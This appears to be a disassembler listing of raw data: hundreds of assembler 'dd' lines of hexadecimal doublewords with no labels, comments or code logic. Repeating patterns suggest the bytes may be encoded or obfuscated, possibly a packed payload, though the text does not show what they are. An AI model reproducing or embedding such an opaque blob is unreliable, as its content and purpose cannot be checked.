		dd 8907A855h, 79FF1004h, 0CBB9882Fh, 5FFC880Bh,	765D2FCFh
		dd 8BE124A3h, 0EFF089h,	3983EFFDh, 0B9AEC3C7h, 1CCBB9C7h
		dd 0CE36DDB0h, 0CFD94428h, 32DCAB49h, 0D924AB3Ah, 0DDC950A2h
		dd 28CBB9C7h, 9969999Eh, 0FBD96C66h, 1CCBA18Dh,	0C0E89797h
		dd 6CFD0086h, 0C5D4F9C4h, 0FDC7E289h, 0FFFC6577h, 8BA79589h
		dd 0CE02040Dh, 0FBBA8B19h, 8BF78A89h, 383BE7BDh, 0EF5784E0h
		dd 6E62FD00h, 0B54666F9h, 0EFFD1056h, 8B2FCE00h, 0E038500h
		dd 64FE8B44h, 150B94Eh,	0AD00EFFDh, 8B947687h, 0AA3A63h
		dd 0FD00EFBDh, 66F57E66h, 4628F14Eh, 996999EDh,	0FBBB898Ch
		dd 0F3BBC7h, 3A00EFFDh,	0EFF72CA9h, 4628FD00h, 0FD00E9CDh
		dd 0DBBBC7EFh, 0EFDA10h, 0FD016615h, 663D85EFh,	429BB946h
		dd 7048A176h, 0BEAF4CB9h, 0AFF968h, 94E8BFFDh, 64FD00EEh
		dd 0A287B956h, 95AC3153h, 18CF9A21h, 8F3468h, 0ACE8BDFDh
		dd 64FD00EEh, 4664B54Eh, 7455BEB9h, 91740CA9h, 1D71508h
		dd 3D85EFFDh, 93762C9Ah, 0EDDCE524h, 0C618A076h, 64FB7422h
		dd 0FFEE9711h, 0D94464EFh, 0EB3E83FBh, 18807440h, 7404177Eh
		dd 9CE924ABh, 0FFED142Ah, 0BB8B1002h, 0ABAB8BA7h, 50A3B38Dh
		dd 0BD0C87ACh, 7AF00EFh, 0EFFDF8h, 0E924AB76h, 0F7D95464h
		dd 1C6BB18Bh, 761CA574h, 65D124A3h, 5EFCD944h, 995DB0A6h
		dd 0EFFD0D66h, 0C46CFD00h, 6D902CD5h, 7F6D907Fh, 907F6D90h
		dd 76F164ABh, 0E93A44A9h, 10EE9898h, 0D4742F78h, 85FD6AB8h
		dd 40E19500h, 1550EFFDh, 0EFFD0047h, 57EB838Dh,	0FD005815h
		dd 441557EFh, 8BEFFD00h, 1550ABBBh, 0EFFD0073h,	24AB0B5Fh
		dd 0F474EEF5h, 883DE8B9h, 0C46CFD00h, 0A3C664F9h, 7FFD042Dh
		dd 8B1E7656h, 3485FBB3h, 0EE760D9Bh, 1010FC6Ah,	0FD14A93Ah
		dd 64FD00EFh, 0C96AE54Eh, 0EC8BE289h, 0FD020185h, 0F7BBC7h
		dd 0A300EFFDh, 7F6D902Ch, 6007D8FFh, 0D8FFFFFCh, 0FFFC6003h
		dd 601FD8FFh, 0D8FFFFFCh, 0FFFC637Bh, 60D3D8FFh, 0D8FFFFFCh
		dd 0FFFC60AFh, 60EFD8FFh, 0D8FFFFFCh, 0FFFC60ABh, 6087D8FFh
		dd 0D8FFFFFCh, 0FFFC6083h, 63FBD8FFh, 0D8FFFFFCh, 0FFFC63F7h
		dd 63F3D8FFh, 0D8FFFFFCh, 0FFFC63CFh, 63E7D8FFh, 0D8FFFFFCh
		dd 0FFFC63E3h, 63FFD8FFh, 31CCFFFCh, 2331CC23h,	0CC2331CCh
		dd 7638037Eh, 64B524A3h, 8BABD944h, 0AB3CCBA9h,	0CB818BB8h
		dd 24A37448h, 0D94466F1h, 85FA8BE7h, 24A37038h,	22BC87F1h
		dd 66AC10EEh, 89CFD954h, 3A24CBB9h, 0EFC924ABh,	0C7EFFD00h
		dd 0FD38CBB9h, 7FD00EFh, 0EFFFF8h, 780C2B7Eh, 62A6752Fh
		dd 6AE7D954h, 0F8E8BDF9h, 64FD00ECh, 82B7EF0h, 8901117Eh
		dd 0CBB98DDDh, 7107AD08h, 7E00EFE1h, 117E042Bh,	83FA8902h
		dd 0F5751403h, 0E3D94464h, 89B3D85h, 0A35F2976h, 2CC5C46Ch
		dd 0FF12455Fh, 7E5E1002h, 643E382Bh, 8DF3D94Ch,	0AF08CBA9h
		dd 0D6150F66h, 83EFFD1Ch, 0A35FEB39h, 2CC5C46Ch, 8BD71183h
		dd 7648CBB1h, 64C124BBh, 53ABD944h, 0B924B376h,	0CBB189B9h
		dd 24A3760Ch, 0D95466A9h, 66C56AFBh, 8BE3D944h,	22BC87FEh
		dd 0BB7010EEh, 52BEED24h, 0D524AB74h, 0D7D94428h, 0EFFD00h
		dd 0C124AB3Ah, 0EFFD00EFh, 40CBB9C7h, 0FD00EFFDh, 0EFE12B07h
		dd 102B7E00h, 0BA752F78h, 0E7D94462h, 0E8BFF96Ah, 0FD00F0E5h
		dd 2B7EF064h, 1117E08h,	0B18DF189h, 7AC08CBh, 0EFD5B4h
		dd 45042B7Eh, 1002FF14h, 1B9B0B85h, 0A65E2976h,	2CC5C46Ch
		dd 1CCBA98Bh, 0F524AB70h, 7EE89BFh, 0EFD590h, 0A3042B7Eh
		dd 0D73983B4h, 907F6DC3h, 6D907F6Dh, 0FFD94464h, 0CCBB18Bh
		dd 0F524BB76h, 64ADFF85h, 51E3D944h, 0C8E8BFAFh, 6C02FF10h
		dd 902CE9C4h, 0F924BB76h, 3EC6C9DCh, 42649C74h,	89C1D4E1h
		dd 0F3B589B5h, 89FBB789h, 0B789E7B7h, 0DFBFC7F7h, 0EFFD01h
		dd 0B589E774h, 0E3B589EBh, 89CFB589h, 0B589C7B5h, 0DFB589C3h
		dd 89D7B589h, 758DD3B5h, 0EFFD05DFh, 0FBBDC7h, 7400EF7Dh
		dd 0A7746CA7h, 4CA77450h, 0E6C06F3Ah, 0EFFC00EFh, 8028FD00h
		dd 0FD00F439h, 1002FF10h, 0B82C3D33h, 2FF1003h,	7F6D902Ch
		dd 907F6D90h, 6D907F6Dh, 7F6D907Fh, 6C64A853h, 7856E3D9h
		dd 8C895702h, 85F3808Bh, 765C9B02h, 6AE5249Bh, 33E980F6h
		dd 16DE1826h, 2E238BE1h, 83ACF9FBh, 0FE7DDF03h,	6AF2E66Ch
		dd 83E589F6h, 0CA7CE703h, 90F2FE6Ch, 34A87632h,	0EA742F78h
		dd 9BD977D6h, 4564AD12h, 0A8FFBFD5h, 0E73983CBh, 0DBBAC7h
		dd 0A800EFFDh, 66F55F66h, 1907D977h, 7EFF1002h,	0B1A2042Bh
		dd 5F2CA65Dh, 3B8B2A3h,	0B402FF10h, 907F6DC3h, 6D907F6Dh
		dd 0E3D94464h, 5602CE55h, 0F2572AC6h, 0EFFD9C6Bh, 8AEF7700h
		dd 0FCDF53F0h, 0E03C3AFFh, 0EF7185h, 0D97C6CFDh, 6AF238F3h
		dd 0EFFD81h, 0ED249B76h, 0E688F5D4h, 0FE57A35Fh, 0A0FF1002h
		dd 0CFBB8B2Ch, 3BF79389h, 3A0A9A38h, 0CBED20A9h, 6E66ED01h
		dd 0D96ED6D5h, 0A93A079Ah, 1CBCD24h, 0D54E64EDh, 0EFE6CC87h
		dd 51EE9700h, 7620B902h, 0E3398317h, 99A003Bh, 1B8B1A2h
		dd 0B202FF10h, 24BB76C3h, 7452BCE9h, 66AB1C91h,	0F107C96Fh
		dd 76FF1003h, 0E7398337h, 0E9B203Bh, 0AA28A976h, 0CBABFFBFh
		dd 89E73983h, 3E8BF393h, 0B2A35FB4h, 0B8B1A2C3h, 2FF1007h
		dd 7F6DC3B2h, 907F6D90h, 6D907F6Dh, 0E3D94464h,	8CBB18Bh
		dd 0F924BB76h, 0E09751BFh, 0FFC51552h, 39831002h, 7F6DC3FFh
		dd 907F6D90h, 0F924AB76h, 6ABDEC6Ch, 56BAAEC0h,	1184E0AAh
		dd 64FD00FAh, 0DB6AE158h, 0E8E16BF2h, 0A77600EFh, 0F26780Ch
		dd 0FD153979h, 0EFC583EFh, 4864F675h, 0F2C96AF9h, 0EFE8C66Ah
		dd 0BD47E00h, 0FEC7E988h
		dd 0EFFD00E3h, 8BE3B58Bh, 0F97864CDh, 64C55364h, 4C66C16Bh
		dd 0B58BC7D9h, 6CFE8BFFh, 4C66E3F8h, 8989CFD9h,	937414CBh
		dd 5466E524h, 8189FFD9h, 0A37438CBh, 4428D124h,	0FD00DBD9h
		dd 68F200EFh, 0EFE87Bh,	0A98BEB16h, 0CB0210CBh,	1EC9985h
		dd 0F54364EDh, 0E488C06Ah, 0E3FEC7h, 0ACE9EFFDh, 6CFD00FAh
		dd 2E9CEDFDh, 790F1078h, 0EFFD155Fh, 0CD642F33h, 2E4FF977h
		dd 0CBB18B0Dh, 82A7E10h, 0E5249374h, 6CBBCAECh,	4C66EDFDh
		dd 8989FFD9h, 3B8F14CBh, 2472C8Bh, 781AB89h, 0EFFD8BF0h
		dd 0EDDCC175h, 1555BAA8h, 0EFFD439Bh, 0C6F7BE89h, 0E230CBB9h
		dd 0DED94429h, 18A4768Bh, 0CD24AB70h, 0BEAD0285h, 0ACAAE8h
		dd 0E5C46CFDh, 66E54366h, 0C7FFD96Ch, 0FD00EEFEh, 0FB2BE9EFh
		dd 4364FD00h, 0ED4328DDh, 0EFFD00EFh, 79B3D85h,	230AF3Ah
		dd 1902FF10h, 0FEEF543h, 0FD004179h, 0CBB18BEFh, 8B3DCE10h
		dd 0FDFFCA3Ch, 0F3C00EFh, 8063C08h, 0E2B92EFEh,	18FD00EFh
		dd 0F3D78F1h, 0FD006578h, 0CBB18BEFh, 833E7610h, 780E01Fh
		dd 64ED74E7h, 0C7BBD944h, 1C90F7BDh, 801410EEh,	8BEFFD14h
		dd 1083CBBEh, 0EB14C1EBh, 10CBB189h, 7E0F0E7Eh,	2F78082Eh
		dd 4B66BC75h, 0FD0155D9h, 2CE00EFh, 55BA1FD3h, 0E95366A8h
		dd 0EFBD4307h, 24BB7600h, 0D94C64E1h, 6E2FF78Fh, 0EDFDE2h
		dd 0F1C46CFDh, 66F4CE6Fh, 0EA2EE543h, 0CD4166F5h, 83741366h
		dd 1D06ED24h, 0C600EFE9h, 64437627h, 0C7BBD94Ch, 1C7CF7BCh
		dd 0EC1410EEh, 8BEFFD14h, 3A54CBB9h, 0E9918AFh,	0F306ED01h
		dd 7E00EFEEh, 0DF8E1012h, 84E00285h, 0FD00FBA5h, 0AB76C9DCh
		dd 0E65ED24h, 76D164B2h, 6C1FD322h, 7C66F5C5h, 3F03F7D9h
		dd 0FF0083A9h, 10CBB989h, 0E9249B74h, 3F76D29Dh, 89E70780h
		dd 0ED74FFAEh, 0BBD94464h, 90F7BDC7h, 1410EE1Ch, 0EFFD1349h
		dd 740F3BF6h, 0D94C64EDh, 0F7BCC7BBh, 10EE1C48h, 0FD137E14h
		dd 0CFBE8BEFh, 89B3D85h, 7E08053Ch, 0FF74010Dh,	0F6FFBE8Bh
		dd 0D874ED39h, 0FFD94464h, 24CBA98Dh, 0D924AB75h, 73C0285h
		dd 24AB7508h, 0E54364D4h, 221550BDh, 83EFFD41h,	0BE89E339h
		dd 281033F7h, 0EFFF03h,	0D96C66FDh, 6CF8EBFFh, 289CDDFDh
		dd 790F1078h, 0EFFD1343h, 44643433h, 0F38AFFD9h, 642C8BA0h
		dd 830D2ECDh, 3F03E738h, 0CF0083A9h, 10CBB989h,	2D8B358Fh
		dd 6ADD4364h, 89EC89C0h, 0BE8BEBADh, 0ED39F6FFh, 4464CA74h
		dd 0F96AFFD9h, 0C7D94467h, 0D064358Bh, 3C18073Ch, 53C0806h
		dd 24AB7510h, 0D94C67D6h, 0CBA988C6h, 18A4762Ah, 0D524AB70h
		dd 0A61551BFh, 83EFFD41h, 0BE89E339h, 281033F7h, 0EFFE03h
		dd 0D96C66FDh, 6CF8EBFFh, 2E9CEDFDh, 790F1078h,	0EFFD13C7h
		dd 10CBB98Bh, 0EB8A3DCEh, 0D2ECD64h, 82A7E4Fh, 0E5249374h
		dd 6CBBC2ECh, 4466EDFDh, 8989FFD9h, 3B8F14CBh, 43642D8Bh
		dd 89C06ADDh, 6E378BFBh, 0EF02E1h, 0F54866FDh, 2EDD4364h
		dd 5066F5EAh, 0ED4364F1h, 9BFFC419h, 24AB7625h,	0D94C62EDh
		dd 0CBB988CBh, 0C1ED9724h, 0B988E715h, 0BC7629CBh, 0E8BDAC18h
		dd 0FD00AF3Dh, 66F1C46Ch, 0EDDCE543h, 0FD04EC3Ah, 837400EFh
		dd 0D564ED24h, 0B10AC76h, 9889042Bh, 73FF0083h,	0F2FF6AD3h
		dd 0EFEF976Bh, 8B2FCE00h, 0B2066530h, 0A376E03Ch, 0C56CED24h
		dd 0D97C66F5h, 0A93503F7h, 89FF0083h, 7410CBB1h, 9DE9249Bh
		dd 8B3E76D4h, 0AE89CFBEh, 9B3D85AFh, 14BF7403h,	0B10AC76h
		dd 0CA89022Bh, 10CBB98Bh, 0D924A370h, 0CBD94467h, 0E82EFF6Ah
		dd 0D94467F5h, 0F7AE8BC6h, 3D07AF51h, 7E00EFBDh, 0AC740C2Bh
		dd 8902CE18h, 7610CB91h, 64F3EB3Ah, 0C06ADD43h,	0BDC7E889h
		dd 0EFFD00FFh, 5EC3A00h, 7600EFFDh, 2B0B10ACh, 0AA6BF204h
		dd 7600EFFDh, 20C640A4h, 1CCBB189h, 328BE98Bh, 0F3D94C66h
		dd 84E03485h, 0FD00EF7Fh, 6ADD5364h, 8BA989D2h,	3D85FFBFh
		dd 0D3D94466h, 4264C674h, 0BD7364E9h, 9D76C6C4h, 1FB7018h
		dd 0F97639C6h, 2176F0C4h, 3CCBA98Bh, 0E9249B76h, 64FF3C62h
		dd 2063CC1h, 358B4A0Eh,	1CFEE16Ch, 24A376A4h, 0D97C64E1h
		dd 0CB898BF7h, 10AC7614h, 89022B0Bh, 0CBB18BF6h, 18BC761Ch
		dd 1552B9ACh, 0EFFD3F7Fh, 28CBB18Bh, 740C2B7Eh,	0AC7618ACh
		dd 316D640h, 74C1C40Ch,	66E52493h, 89FBD974h, 0BE8BAFBEh
		dd 0E03D85AFh, 0FE9A85h, 0D95464FDh, 0AFBEC7FFh, 0EFFD00h
		dd 0FD06EC3Ah, 0AC7600EFh, 82B0B10h, 0FD8B6BF2h, 107800EFh
		dd 11AD790Fh, 3433EFFDh, 0EB77C0DCh, 4C66BC31h,	0B68BF3D9h
		dd 663485CFh, 74DFD944h, 0E15164DCh, 0BB74D26Ah, 169BC124h
		dd 0C640BC76h, 0E18E20BEh, 3CCBB18Bh, 7611EB75h, 66BC40A4h
		dd 0C06ABD4Bh, 0B18BE789h, 20C61CCBh, 4B644372h, 0FFC519EDh
		dd 0BB76199Bh, 4364E124h, 0AD56BDE5h, 0EFC3E707h, 18AC7400h
		dd 0C124AB76h, 64F1C46Ch, 2BF3D94Ch, 78F1EC04h,	0CB81892Fh
		dd 249B7418h, 3885E0E9h, 64FD00FFh, 0EBFFD954h,	0DD4364F3h
		dd 0E889C06Ah, 0F3BDC7h, 3A00EFFDh, 0EFFD40ACh,	328FD00h
		dd 0FD00EFFAh, 19ED4364h, 84E0EDC4h, 0FD00EF76h, 6BF2FF6Ah
		dd 0EFED90h, 3D3326CEh,	0AECC0465h, 1CCBB189h, 7820A476h
		dd 0CBB98926h, 8BCE8930h, 2F85CBACh, 0D3D95466h, 5364EB74h
		dd 0D551D4BDh, 0A3760E9Ch, 467C124h, 0BD4B64ECh, 0AFB689AEh
		dd 89B3D85h, 0E124A376h, 518FCFD4h, 0F6FFB68Bh,	0E474ED38h
		dd 0F3D95464h, 52F7BE8Bh, 0C8E8BFABh, 66FD00D1h, 4464E543h
		dd 3983D3D9h, 0CBB18BE3h, 316D61Ch, 74C06A0Ch, 66E52493h
		dd 0FFBD974h, 0FD10FC78h, 0CBA98BEFh, 8BE11610h, 3D85CFBEh
		dd 0AF3A079Bh, 0EFFD24h, 0F50328FDh, 64FD00EFh,	0C419ED43h
		dd 7E579BFFh, 0DF8E1012h, 84E00285h, 0FD00E019h, 0AB76C9DCh
		dd 0E65ED24h, 76D164B2h, 6C1FD322h, 7C66F5C5h, 3F03F7D9h
		dd 0FF0083A9h, 10CBB989h, 0E9249B74h, 3F76D29Dh, 25F7BE8Bh
		dd 0FD001002h, 0FF89D0D4h, 54CBB18Bh, 0C918AE3Ah, 6ED010Eh
		dd 0EFF22Eh, 918902CEh,	0AC7610CBh, 742F7820h, 0ED5364EBh
		dd 6CF4FA2Eh, 5066FCE2h, 0DD4364D1h, 0EECD4028h, 6AEFFD00h
		dd 970085FDh, 0D28FE8EFh, 4C64FD00h, 0BE898FD9h, 0E33983F7h
		dd 0C7DFBC89h, 0FD00E4FEh, 0E113E9EFh, 0FD6CFD00h, 782E9CDDh
		dd 0A2790F10h, 8BEFFD0Fh, 0CE10CBB9h, 64EB8A3Dh, 4F0D2ECDh
		dd 74082A7Eh, 0ECE52493h, 0FD6CBBC2h, 0D94466DDh, 0CB8989FFh
		dd 8B3B8F14h, 76C2642Dh, 0EF022525h, 0E16EFD00h, 0FD0010FDh
		dd 0ECEDE02Eh, 8A26CEC1h, 3C12CB91h, 2EFE080Fh,	54CBB18Bh
		dd 0FE18053Ch, 6610332Dh, 4166E543h, 0D96C66CDh, 0E5FEC7FFh
		dd 8BEFFD00h, 76040428h, 64A924A3h, 0C06AF143h,	0F3966BF2h
		dd 0EF9700EFh, 85FD6Ah,	0FD3AB015h, 0CBA98BEFh,	18AC7460h
		dd 740C2B7Eh, 0EC3A30ADh, 0EFFD0Bh, 0A524AB76h,	0E0F8F86Ch
		dd 0E15284h, 0FBF86CFDh, 0E15B84E0h, 5464FD00h,	0BE8BFFD9h
		dd 9B3D85EBh, 0C7227618h, 0FD00F5FEh, 0E81C83EFh, 0E9C417D3h
		dd 0ED24BB74h, 0EFF31706h, 3127E00h, 285C18Eh, 0E18B84E0h
		dd 0C0DCFD00h, 0FB8A2276h, 641DD3A0h, 83FFD94Ch, 8189E738h
		dd 27FE18CBh, 3127E46h,	0ED24A374h, 0FBD97466h,	0D1642972h
		dd 17D12576h, 0E7EC264h, 30F7E01h, 0FEF86CB0h, 66F94B66h
		dd 77FFD954h, 7824108Ch, 0FFFC030Fh, 0C7ED17C1h, 0FD00E2FEh
		dd 0CBA989EFh, 2027E10h
		dd 0FD0D4014h, 0A1553EFh, 8BEFFD0Fh, 7E5CCBB9h,	177E042Bh
		dd 13EC3A06h, 0F200EFFDh, 0EFF0AB6Bh, 24BB7600h, 0FFEA2EEDh
		dd 0FFD95466h, 0E9ED1083h, 0FD00E27Dh, 28FFEA2Eh, 0EFED03h
		dd 0D95466FDh, 0ED1083FFh, 0E296E9h, 0D94464FDh, 0F7BDC7BBh
		dd 10EE1C20h, 0FD1DEC3Ah, 53C00EFh, 24BB7402h, 0FFED6CEDh
		dd 0EFF04B06h, 83227600h, 17D3E81Ch, 127EE9C4h,	24BB7420h
		dd 78309CEDh, 72790F10h, 33EFFD0Dh, 0D9446434h,	0A0F38AFFh
		dd 0CD642C8Bh, 38830D2Eh, 0CB8189E7h, 462DFE18h, 7420127Eh
		dd 66ED24ABh, 72FBD974h, 76D0642Fh, 0CA2FF72Dh,	0EF02FFh
		dd 0C610053Ch, 64ED742Dh, 0C7BBD944h, 1C00F7BDh, 0C1410EEh
		dd 89EFFD0Ch, 0B98BAFBEh, 2CE58CBh, 89E90583h, 3A10CB91h
		dd 0EFFD0EECh, 396BF200h, 3A00EFF0h, 0EFFD0FECh, 40A47600h
		dd 0B1892678h, 6BF21CCBh, 0EFFAABh, 0FB7620C6h,	0A374CF64h
		dd 4464E124h, 353BCFD9h, 27760699h, 1CCBB189h, 790F2678h
		dd 0EFFD0DEBh, 14CBB98Bh, 0D5249376h, 1F76D164h, 0F3ED14C1h
		dd 76CA6458h, 6CE524BBh, 0A41CFEE1h, 0E124A376h, 0CFD97464h
		dd 0C1EC2C2Bh, 0E524BB74h, 0C7D95464h, 18CB818Bh, 0E924AB74h
		dd 0C4BD4364h, 2B3EFEF1h, 0D974663Ch, 0CB898BCFh, 24BB7414h
		dd 0BD4366D5h, 0EFF14306h, 0E127E00h, 285C18Eh,	0E35F84E0h
		dd 0C0DCFD00h, 0FB8A2276h, 641DD3A0h, 83FFD94Ch, 8189E738h
		dd 27FE18CBh, 0E127E46h, 0ED24A374h, 0FBD97466h, 0D1642972h
		dd 10832576h, 0EA17C1E1h, 8BF01C83h, 0FCC16E3Fh, 6CFD00EEh
		dd 0EA2EE2E0h, 9D4B66F8h, 66378BAFh, 43649943h,	0F2E16C9Dh
		dd 2EF9C16Ch, 1ED2F9EAh, 7400EFFCh, 0BB745CA4h,	87E0ED24h
		dd 0FD00EF03h, 0F1997B6Ch, 1B7A0Fh, 0BEC7EFFDh,	0EFFD0087h
		dd 11EC3A00h, 7600EFFDh, 0A47668ACh, 732EC65Ch,	0FEFD6C95h
		dd 1078309Ch, 0CE1790Fh, 3433EFFDh, 0FFD94464h,	8BA0F38Ah
		dd 2ECD642Ch, 0E738830Dh, 18CB8189h, 7E462DFEh,	0AB740312h
		dd 7466ED24h, 2F72FBD9h, 0AC76D064h, 8326CE68h,	1083E81Fh
		dd 0E37666ECh, 181E145h, 0A98989EDh, 0BC7670A4h, 5CA47668h
		dd 955366BFh, 0BB76C264h, 0EA2EED24h, 74C1D4FEh, 9DED24BBh
		dd 68A47698h, 0FD00FC45h, 9C353BEFh, 68BC7621h,	766626CEh
		dd 81E155E3h, 0C789ED01h, 0FD70A4B9h, 87AE8BEFh, 89257642h
		dd 353B87AEh, 0A470DF9Dh, 306C706Ch, 7400EFF8h,	7C704CACh
		dd 0EFFFF0h, 0BE8DEE74h, 28AD52BBh, 0EFFA00h, 0BE8DBEFDh
		dd 0BFEE6A9Fh, 1907FD6Ah, 7E00EFCFh, 0AB74182Bh, 0C06AC924h
		dd 0B18BCF89h, 0AE3A54CBh, 10F1918h, 0F7CC06EDh, 0BB7600EFh
		dd 4228A924h, 0FCE02FE5h, 0E541E9FFh, 4328FD00h, 0FD00EF95h
		dd 0FDFEC7EFh, 8BEFFD00h, 0BE8B8BAEh, 87B68B8Fh, 0C8D43F03h
		dd 0C124AB74h, 0ED6E83E0h, 4B64FD00h, 0FD0155A9h, 0D2E00EFh
		dd 4AA3BE8Bh, 0B1232576h, 0EB7610CBh, 24AB7488h, 0D94464BDh
		dd 6E358BAEh, 0EF02E1h,	8BCDD4FDh, 0E00285A6h, 0E52A84h
		dd 76C0DCFDh, 0A0FB8A22h, 4C641DD3h, 3883FFD9h,	0CB8189E7h
		dd 4627FE18h, 0ED24A374h, 0AB76CA64h, 7466ED24h, 3523FBD9h
		dd 64B14364h, 44667504h, 0B98BAFD9h, 277641CBh,	101C81h
		dd 303BEFFDh, 0A376B798h, 8389BF24h, 0A673FF04h, 0EFFDFFCAh
		dd 7307C600h, 0F2FF6AD6h, 0EFF77B6Bh, 8B3DCE00h, 0B2166530h
		dd 0A376E23Ch, 0C56CED24h, 0D97C66F5h, 0A93703F7h, 4C66153Bh
		dd 8989FFD9h, 3A8F14CBh, 10CBA98Bh, 152B2776h, 3C954364h
		dd 4C649BEAh, 7466ADD9h, 648D43A3h, 89AF9543h, 7410CBA9h
		dd 6C1468ACh, 75EFFD01h, 0FDFFCA81h, 0AB7400EFh, 5062E124h
		dd 8EEAD4FFh, 0E00285C0h, 0E5EA84h, 76C0DCFDh, 0A0FB8A22h
		dd 4C641DD3h, 3883FFD9h, 0CB8189E7h, 4627FE18h,	0B18905C6h
		dd 9B7410CBh, 0D59DE924h, 0E124AB76h, 0FFD95464h, 0EA3C358Bh
		dd 0D668A476h, 66348507h, 0FFFD954h, 0FD01AD79h, 893D33EFh
		dd 6EA4B98Bh, 0B9892576h, 2E7630CBh, 0C1EC1D83h, 3D83ED14h
		dd 0CBB189ECh, 2027E10h, 0FD003514h, 167E66EFh,	753F7611h
		dd 2E26E94h, 62FD00EFh,	0E8D4FE42h, 285DF8Eh, 0E66B84E0h
		dd 0C9DCFD00h, 740E65B2h, 64E52493h, 0D32276C1h, 0D94C641Dh
		dd 0E73883FFh, 42623503h, 153BA9FEh, 0FFD94C66h, 14CB8989h
		dd 0B98B3F8Fh, 257610CBh, 442815D3h, 0FD00DFD9h, 0AB7400EFh
		dd 0E06CED24h, 0D94C64FAh, 0EC3D83FFh, 89EC14C1h, 4410CBB1h
		dd 1002FF12h, 0E26E98EBh, 0FD00EF02h, 0D4FA4262h, 85C18EE8h
		dd 0D084E002h, 0DCFD00E6h, 8A2276C0h, 1DD3A0FBh, 0FFD94C64h
		dd 89E73883h, 0FE18CB81h, 0E8BF8D27h, 8907C646h, 7410CBB1h
		dd 9DE9249Bh, 24AB76D2h, 2ECA64EDh, 0CBB9C707h,	0EFFD30h
		dd 0D94466FDh, 901D83FFh, 10CBB18Bh, 3C0B2F7Eh,	0A3740706h
		dd 0F956ED24h, 0D6FF1002h, 64140325h, 5464954Bh, 3503D3D9h
		dd 0AB8ACAD4h, 85A72D8Bh, 76179B2Fh, 0AFCD24A3h, 6687AE8Bh
		dd 8D53A374h, 0AD955364h, 68BC7448h, 0BE8B0188h, 8FB68B8Bh
		dd 4B643C03h, 74C8D495h, 0E0C124ABh, 0FF127082h, 761E0402h
		dd 28A924BBh, 0E04BE542h, 0F6EBFFFCh, 0BBD94464h, 0A4F7BDC7h
		dd 3A10EE1Dh, 0EFFD1DECh, 1DD47E00h, 0F5026BF2h, 6C9B00EFh
		dd 0ED8DBBh, 0ED75EFFDh, 0BBD94C64h, 7CF7BCC7h,	1410EE1Dh
		dd 0EFFD070Dh, 8D83B68Dh, 0FD05DF7Eh, 0A3BE89EFh, 21F6E8Dh
		dd 0FC89EFFDh, 0BDA94362h, 0C78FAE8Bh, 0FD00E6FDh, 62AC50EFh
		dd 50BD8D43h, 18E8EE97h, 6CFD00C1h, 4466E5C4h, 3D85DBD9h
		dd 0A376109Bh, 4128A924h, 0FCE08FE5h, 0E865E9FFh, 5364FD00h
		dd 914B6291h, 62AD5366h, 0ED0D93h, 0A54362FDh, 64AC50BDh
		dd 289D4Bh, 0FD00EFFBh,	62994364h, 509FB654h, 150285AFh
		dd 0EFFD2E73h, 89F73983h, 7834CBB9h, 64ED742Fh,	0C7BBD944h
		dd 1D48F7BDh, 0A01410EEh, 8BEFFD07h, 3A58CBB9h,	0EFFD13ECh
		dd 6177E00h, 0FAAE6BF2h, 0BB7600EFh, 328ED24h, 0FD00EFE9h
		dd 9DFBFF6Ch, 24937C7Ch, 0FD01EDDDh, 648F72EFh,	8BBBD944h
		dd 7620CBA9h, 66D524A3h, 5464ED50h, 0B589C3D9h,	0CBB18BE3h
		dd 3066AF10h, 0AD049774h, 66C54B66h, 8907C16Bh,	7600EFD4h
		dd 64A124ABh, 0C46CC16Bh, 0F14864F5h, 64ED5064h, 4977630h
		dd 7438AC76h, 66D524A3h, 8BFFD944h, 0F6F86CFEh,	0CFD95466h
		dd 14CB8989h, 0E5249374h, 0E93B85E0h, 8328FD00h, 0FD00F439h
		dd 1002FF10h, 0E94AE9h,	0A94B64FDh, 0EFFD0157h,	8B0F2E00h
		dd 7EC7A3B6h, 0EFFD1B2Bh, 0EFFD00h, 0D94466B5h,	643F23D3h
		dd 44667C04h, 0B18BAFD9h, 0E7C41CBh, 0EFFDFFh, 0B07622C6h
		dd 0D3D95464h, 84E00285h, 0FD00E919h, 2276C0DCh, 0D3A0FB8Ah
		dd 0F5C56C1Dh, 0F7D97C66h, 4464358Bh, 3C03FFD9h, 0AB74CA64h
		dd 0C8CCED24h, 0BB4CAC76h, 0FBD97466h, 8967F98Bh, 7640CBB9h
		dd 6EBC24A3h, 0EF02E1h,	8ACDD4FDh, 0CBA98B54h, 0F2F7910h
		dd 0FD003379h, 0E00DA8EFh, 0EF2985h, 0D94C64FDh, 0CBB989AEh
		dd 0FF0E7C48h, 7400EFFDh, 65E124A3h, 24AB76C8h,	45C8ECE1h
		dd 0EFFD00EEh, 4C641DD3h, 0DE48F3D9h, 6415D32Dh, 81ADD94Ch
		dd 0FDFF101Ch, 643C03EFh, 4CAC76C8h, 7488EB76h,	64BD24ABh
		dd 8BA6D944h, 0D841CBB1h, 0EFFD0010h, 101C81h, 3503EFFDh
		dd 868BCDD4h, 84E00285h, 0FD00E9CDh, 2276D2DCh,	0D3A0EB8Ah
		dd 0D94C641Fh, 0E73883FFh
		dd 18CB8189h, 0FCBA25FEh, 66FD00EFh, 8AFFD94Ch,	0FE48CBB1h
		dd 0D2E4627h, 10CBB18Bh, 0E9249B74h, 642C23A5h,	8B052EC8h
		dd 7C4ACBB1h, 0EF02FF0Eh, 8B3EFE00h, 0E98BA3B6h, 0CBA9897Eh
		dd 24A37640h, 2E16EBCh,	0ECFD00EFh, 7722C6C8h, 0D9546466h
		dd 66358BFFh, 0F43983h,	0D6EA3CFDh, 0CBB98B07h,	24A37640h
		dd 2E16EBCh, 0EEFD00EFh, 0F4398Bh, 0D94C66FDh, 0C417D3F3h
		dd 24A376E9h, 2E16EBFh,	6BFD0010h, 24BB74C0h, 0BD4B66EDh
		dd 0EC3A0B9Ah, 0EFFD19h, 0FD05F414h, 9BDDA8EFh,	0C46C3A15h
		dd 200EFE6h, 2802FF10h,	0EFF603h, 0F80206FDh, 0AF5500EFh
		dd 5464ED74h, 0BFC7BBD9h, 0EE1D2CF7h, 4071410h,	1D83EFFDh
		dd 0FAFEC7E0h, 89EFFD00h, 0BE8BA7BEh, 9B3D85A7h, 7307C668h
		dd 0F2FF6AD2h, 0EFF83B6Bh, 4F26CE00h, 8189E177h, 3E7618CBh
		dd 0E23C308Bh, 0ED24A376h, 0ECF5C56Ch, 0E8D4BBCAh, 0ED24A374h
		dd 0FBD97466h, 0D1642E72h, 0FD00EE44h, 0CBB189EFh, 8B27763Ch
		dd 2E3CCBB9h, 0AFB68B0Fh, 32DDE48h, 39836435h, 66FD00F4h
		dd 4B64BD4Bh, 0D6EA3CB5h, 663C0306h, 0F43983h, 0D95466FDh
